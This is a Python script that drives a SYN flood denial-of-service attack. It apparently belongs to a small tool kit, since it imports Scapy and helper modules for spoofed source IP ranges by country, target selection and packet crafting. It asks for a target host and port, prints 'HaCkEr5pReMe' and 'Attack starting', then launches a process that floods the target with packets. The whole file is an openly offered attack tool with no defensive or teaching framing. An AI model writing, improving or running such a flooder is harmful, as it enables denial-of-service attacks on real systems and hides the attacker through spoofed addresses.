#!/usr/bin/env python

import multiprocessing
from scapy.all import *	
import socket
from userinputs_synflood import *
from Ipchanging_synflood import *
from definepacket_synflood import *
import os
import random
import time

hostname = socket.gethostname()
yourIP = socket.gethostbyname(hostname)
hostname = socket.gethostname()
yourIP = socket.gethostbyname(hostname)
supcountries = supcountries()
destination = definetarget()
targetport = defineporttarget()
awnser_anonymizing = anonymizing_input(supcountries)


if awnser_anonymizing in supcountries:
   useriprange = chooseiprange(awnser_anonymizing, supcountries)
   Ip_range = ipRange(useriprange)
   time.sleep(5)
   os.system('clear')
   print 'HaCkEr5pReMe'
   print ''
   print 'Attack starting'      

if awnser_anonymizing == yourIP:
   Ip_range = yourIP
   time.sleep(5)
   os.system('clear')
   print 'HaCkEr5pReMe'
   print ''
   print 'Attack starting'

if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:  
    Ip_range = awnser_anonymizing
    time.sleep(5)
    os.system('clear')
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
    


if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
        useriprange = chooseiprange(awnser_anonymizing, supcountries)
        Ip_range = ipRange(useriprange)
        time.sleep(5	)
        os.system('clear')
        print 'HaCkEr5pReMe'
        print ''
        print 'Attack starting'
        



p = multiprocessing.Process(target= sendpacket, args=(Ip_range, destination, targetport))
p.start()
p.join()






        
        
        

